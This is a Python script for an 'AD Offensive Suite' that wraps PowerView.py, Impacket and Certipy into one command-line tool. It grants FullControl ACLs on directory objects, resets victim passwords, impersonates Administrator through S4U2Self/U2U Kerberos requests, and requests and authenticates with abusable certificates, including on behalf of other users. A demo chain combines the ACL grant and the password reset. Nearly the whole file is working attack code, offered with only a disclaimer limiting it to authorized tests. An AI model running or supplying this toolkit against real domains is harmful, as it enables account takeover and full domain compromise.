#!/usr/bin/env python3
"""
..testing..

Summary
--------
A self-contained, Python‑based Active Directory operations toolkit combining:

   • PowerView.py enumeration and ACL abuse wrappers
   • Minimal Kerberos TGT/TGS logic (via subprocess calls to Impacket binaries)
   • Certificate template and authentication helpers (wrapped Certipy calls)
   • Unified command interface for Red‑Team & assessment workflows

All modules called are expected to reside in the same directory.

This script is educational and intended for use in authorized penetration tests
or controlled lab environments only.
"""

import argparse
import os
import subprocess
import sys
from pathlib import Path
from datetime import datetime

# ------------------------------ #
#        CONFIGURATION           #
# ------------------------------ #

BASE_DIR = Path(__file__).resolve().parent
POWERVIEW = BASE_DIR / "powerview.py"

DEFAULT_DC_IP = "10.10.10.10"
DEFAULT_DOMAIN = "example.com"

KRB5CCNAME = os.environ.get("KRB5CCNAME", str(BASE_DIR / "user.ccache"))

# Basic utilities -------------------------------------------------------------

def run(cmd, quiet=False):
    """Execute subprocess commands with output capture."""
    proc = subprocess.run(cmd, text=True, capture_output=True)
    if not quiet:
        print(proc.stdout)
        if proc.stderr:
            print(proc.stderr)
    return proc.returncode, proc.stdout.strip(), proc.stderr.strip()

def header(text):
    print("\n" + "="*80)
    print(f"[+] {text}")
    print("="*80)

# ------------------------------ #
#      POWERVIEW FUNCTIONS       #
# ------------------------------ #

def pview(query, user, kerberos=True, dc_ip=DEFAULT_DC_IP, domain=DEFAULT_DOMAIN):
    """Wrapper around PowerView.py queries."""
    cmd = [
        "python3", str(POWERVIEW),
        f"{domain}/{user}@dc.{domain}",
        "--dc-ip", dc_ip,
        "-k" if kerberos else "--no-pass",
        "-q", query
    ]
    header(f"Running powerview query -> {query}")
    run(cmd)

def enum_baseline(user):
    """Baseline enumeration sequence."""
    queries = [
        "Get-Domain",
        "Get-DomainController",
        "Get-DomainTrust",
        "Get-DomainUser -Properties name,mail,title",
        "Get-DomainGroup",
        "Get-DomainComputer -Properties name,operatingSystem"
    ]
    for q in queries:
        pview(q, user)

def add_acl(user, target, principal, rights="fullcontrol", inherit=False):
    q = f"Add-DomainObjectAcl -TargetIdentity '{target}' -PrincipalIdentity '{principal}' -Rights {rights}"
    if inherit:
        q += " -Inheritance"
    pview(q, user)

def reset_password(user, target, newpass):
    q = f"Set-DomainUserPassword -Identity '{target}' -AccountPassword '{newpass}'"
    pview(q, user)

# ------------------------------ #
#      KERBEROS OPERATIONS       #
# ------------------------------ #

def get_tgt(domain_user, password=None, dc_ip=DEFAULT_DC_IP):
    """Obtain TGT using impacket.getTGT style command."""
    cmd = ["getTGT.py", f"{DEFAULT_DOMAIN}/{domain_user}:{password}", "-dc-ip", dc_ip]
    header(f"Requesting TGT for {domain_user}")
    run(cmd)
    print("[*] Ticket saved in current directory (user.ccache or similar).")

def describe_ticket(cache_file):
    """Describe Kerberos ticket session key."""
    cmd = ["describeTicket.py", cache_file]
    header(f"Describing {cache_file}")
    run(cmd)

def impersonate_admin(cache_file, spn="cifs/dc.example.com"):
    """Perform simplified S4U2Self + U2U impersonation."""
    cmd = [
        "getST.py", "-u2u",
        "-impersonate", "Administrator",
        "-spn", spn, "-k", "-no-pass",
        f"{DEFAULT_DOMAIN}/serviceaccount$"
    ]
    os.environ["KRB5CCNAME"] = str(cache_file)
    header("Performing S4U2Self/U2U Impersonation")
    run(cmd)

# ------------------------------ #
#     CERTIFICATE OPERATIONS     #
# ------------------------------ #

def cert_request(upn, template="User", ca_template="CA-EXAMPLE", dc_ip=DEFAULT_DC_IP, application_policy=None, on_behalf=None):
    """Wrapper around Certipy-like certificate request."""
    cmd = [
        "certipy-ad", "req",
        "-k", "-upn", upn,
        "-dc-ip", dc_ip,
        "-ca", ca_template,
        "-template", template
    ]
    if application_policy:
        cmd += ["-application-policies", application_policy]
    if on_behalf:
        cmd += ["-on-behalf-of", on_behalf, "-dcom"]

    header(f"Requesting certificate for {upn}")
    run(cmd)

def cert_auth(pfx, user):
    """Authenticate using pfx certificate."""
    cmd = ["certipy-ad", "auth", "-pfx", pfx, "-username", user, "-domain", DEFAULT_DOMAIN, "-dc-ip", DEFAULT_DC_IP]
    header(f"Authenticating with {pfx}")
    run(cmd)

# ------------------------------ #
#       COMBINED EXAMPLES        #
# ------------------------------ #

def full_recon(user):
    header(f"Started baseline recon for {user}@{DEFAULT_DOMAIN}")
    enum_baseline(user)

def enable_chain(user):
    """Example chain: Add ACL -> Enable account -> Reset password."""
    target_ou = "OU=Target,DC=example,DC=com"
    victim = "test.user"
    add_acl(user, target_ou, user, inherit=True)
    reset_password(user, victim, "NewPass123!")
    header("Enable/Reset chain complete.")

# ------------------------------ #
#       USER INTERFACE           #
# ------------------------------ #

def main():
    parser = argparse.ArgumentParser(description="AD Offensive Suite (PowerView / Kerberos / Certipy wrapper)")
    parser.add_argument("-u", "--user", help="Domain user (sAMAccountName)")
    parser.add_argument("--action", required=True,
                        choices=[
                            "recon", "add-acl", "reset-pass",
                            "get-tgt", "describe-ticket",
                            "impersonate", "cert-req", "cert-auth",
                            "demo-chain"
                        ])
    parser.add_argument("--target")
    parser.add_argument("--principal")
    parser.add_argument("--rights", default="fullcontrol")
    parser.add_argument("--inherit", action="store_true")
    parser.add_argument("--password")
    parser.add_argument("--pfx")
    parser.add_argument("--template", default="User")
    parser.add_argument("--on-behalf")
    parser.add_argument("--upn")
    parser.add_argument("--ticket")
    args = parser.parse_args()

    start = datetime.now()

    if args.action == "recon":
        full_recon(args.user)
    elif args.action == "add-acl":
        add_acl(args.user, args.target, args.principal or args.user, args.rights, args.inherit)
    elif args.action == "reset-pass":
        reset_password(args.user, args.target, args.password)
    elif args.action == "get-tgt":
        get_tgt(args.user, args.password)
    elif args.action == "describe-ticket":
        describe_ticket(args.ticket)
    elif args.action == "impersonate":
        impersonate_admin(args.ticket)
    elif args.action == "cert-req":
        cert_request(args.upn, template=args.template, on_behalf=args.on_behalf)
    elif args.action == "cert-auth":
        cert_auth(args.pfx, args.user)
    elif args.action == "demo-chain":
        enable_chain(args.user)

    duration = (datetime.now() - start).total_seconds()
    print(f"[+] Action '{args.action}' completed in {duration:.1f}s")

if __name__ == "__main__":
    main()
